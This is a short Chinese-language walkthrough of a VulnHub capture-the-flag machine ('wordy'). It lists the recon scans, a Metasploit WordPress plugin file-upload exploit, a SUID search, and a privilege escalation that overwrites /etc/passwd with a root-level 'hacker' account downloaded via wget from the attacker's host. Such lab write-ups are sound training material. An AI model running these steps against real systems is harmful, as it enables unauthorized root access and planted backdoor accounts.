本周实践的是vulnhub的wordy镜像，下载地址，https://download.vulnhub.com/ha/ha-wordy.ova，

启动靶机，知道是个ubuntu系统，有个账户是raj，

先来个地址扫描，sudo netdiscover -r 192.168.137.0/24，

接着来个端口扫描，sudo nmap -sS -sV -T4 -A -p- 192.168.137.252，


既然有web服务，就再来个目录爆破，

sudo dirb http://192.168.137.252，

发现是wordpress，那就继续上更高级的手段，

wpscan --url http://192.168.137.252/wordpress -e vp,vt，

这个地方有个问题，没有token的话，是显示不出来漏洞的，

需要先注册一个wpvulndb的账户，拿到token，然后本地创建一个文件，把token填进去，

vim ~/.wpscan/scan.yml，

cli_options:
    api_token: xxx...xxx

针对第一个，直接就拿到了shell，但不是root，需要再继续研究怎么提权，

use exploit/unix/webapp/wp_reflexgallery_file_upload
set RHOSTS 192.168.137.252
set TARGETURI /wordpress
exploit

转成普通shell，继续转交互式shell没成功，先不管，查一下都哪些程序是root权限的，find / -perm -u=s -type f 2>/dev/null，

看到wget，这就有底了，可以对/etc/passwd下手了，

先把靶机的/etc/passwd内容拷贝到攻击机的新建passwd文件里，

然后做个账户密码放进去，

perl -le 'print crypt("password","salt")'，
echo "hacker:sa3tHJ3/KuYvI:0:0:hacker:/root:/bin/bash" >> passwd，

攻击机上开个web服务，sudo python -m SimpleHTTPServer 80，

再下载到靶机里，覆盖掉原来的/etc/passwd文件，

wget -O /etc/passwd http://192.168.137.197/passwd，

为了执行sudo，还真得把shell转成交互式的，经过尝试，发现python3可以，python3 -c 'import pty;pty.spawn("/bin/bash")'，

执行sudo，拿到root权限，
